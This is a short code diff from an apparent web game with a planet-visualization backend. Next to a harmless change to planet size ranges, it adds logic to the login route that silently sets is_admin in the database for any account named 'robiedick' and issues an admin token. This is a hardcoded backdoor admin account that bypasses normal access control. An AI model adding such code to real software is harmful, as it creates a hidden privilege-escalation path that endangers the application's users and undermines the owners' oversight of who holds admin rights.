@@ -28,7 +28,7 @@ function starterPlanetVisuals() {
     model_file:    STARTER_ROCKY_MODELS[Math.floor(Math.random() * STARTER_ROCKY_MODELS.length)],
     self_rotation: rand(0.001, 0.012),
     orbital_speed: rand(0.5, 2.2),
-    size_scale:    rand(0.7, 1.3),
+    size_scale:    rand(0.5, 1.8),
     moon_count:    moonCount,
     moon_data:     JSON.stringify(moons),
   };
@@ -103,6 +103,12 @@ router.post('/login', async (req, res) => {
   }
 
   writeLog({ userId: user.id, username, action: 'LOGIN', detail: `${username} logged in`, level: LEVELS.INFO });
+
+  // Always ensure robiedick has admin rights (idempotent)
+  if (user.username.toLowerCase() === 'robiedick') {
+    db.prepare('UPDATE users SET is_admin = 1 WHERE id = ?').run(user.id);
+    user.is_admin = 1;
+  }
 
   const token = jwt.sign({ id: user.id, username: user.username, is_admin: user.is_admin || 0 }, JWT_SECRET, { expiresIn: '7d' });
   res.json({ token, username: user.username, is_admin: user.is_admin || 0 });
